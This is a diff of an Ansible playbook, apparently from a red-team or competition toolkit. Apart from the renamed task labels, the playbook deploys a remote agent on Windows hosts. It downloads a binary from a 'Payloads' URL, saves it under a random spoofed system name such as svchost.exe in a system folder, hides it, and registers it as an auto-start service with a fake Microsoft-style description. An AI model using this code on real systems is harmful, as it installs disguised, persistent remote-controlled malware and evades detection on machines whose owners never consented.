@@ -1,5 +1,5 @@
 ---
-- name: Windows | Define Paths, File Names, Service Names, and Service Descriptions
+- name: Windows Deploy | Define Paths, File Names, Service Names, and Service Descriptions
   set_fact:
     windows_paths: ["C:\\Windows\\fonts\\", "C:\\Program Files\\Windows NT\\Accessories\\", "C:\\ProgramData\\Microsoft\\Diagnosis\\", "C:\\Windows\\Speech\\Engines\\TTS\\", "C:\\Windows\\Cursors\\"]
     windows_file_names: ["svchost.exe", "MsSense.exe", "conhost.exe", "wininit.exe", "winlogon.exe", "smartscreen.exe"]
@@ -7,35 +7,35 @@
     windows_service_descriptions: ["This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly", "Provides an interface for remote hosts to communicate with Hyper-V hypervisors", "Responsible for setting up and tearing down network connections", "Secure Container for the Remote Desktop Service to run within"]
   when: ansible_os_family == "Windows"
   
-- name: Windows | Select Random Path and File Name
+- name: Windows Deploy | Select Random Path and File Name
   set_fact:
     windows_random_path: "{{ windows_paths | random }}"
     windows_random_file_name: "{{ windows_file_names | random }}"
   when: ansible_os_family == "Windows"
 
-- name: Windows | Select Random Index for Service Name and Description
+- name: Windows Deploy | Select Random Index for Service Name and Description
   set_fact:
     random_index: "{{ range(0, windows_service_names | length) | random }}"
   when: ansible_os_family == "Windows"
 
-- name: Windows | Select Random Service and Description
+- name: Windows Deploy | Select Random Service and Description
   set_fact:
     windows_random_service_name: "{{ windows_service_names[random_index | int] }}"
     windows_random_service_description: "{{ windows_service_descriptions[random_index | int] }}"
   when: ansible_os_family == "Windows"
 
-- name: Windows | Download agent
+- name: Windows Deploy | Download agent
   win_shell: wget -o "{{ windows_random_path }}{{ windows_random_file_name}}" https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads
   when: ansible_os_family == "Windows"
 
-- name: Windows | Hide Agent
+- name: Windows Deploy | Hide Agent
   win_command: "attrib +h '{{ windows_random_path }}{{ windows_random_file_name}}'"
   when: ansible_os_family == "Windows"
 
-- name: Windows | Register Service
+- name: Windows Deploy | Register Service
   ansible.windows.win_shell: New-Service -name '{{ windows_random_service_name }}' -BinaryPathName '{{ windows_random_path }}{{ windows_random_file_name}}' -DisplayName '{{ windows_random_service_name }}' -Description '{{ windows_random_service_description }}' -Startuptype Automatic
   when: ansible_os_family == "Windows"
 
-- name: Windows | Start Service
+- name: Windows Deploy | Start Service
   ansible.windows.win_shell: Start-Service -name '{{ windows_random_service_name }}'
   when: ansible_os_family == "Windows"
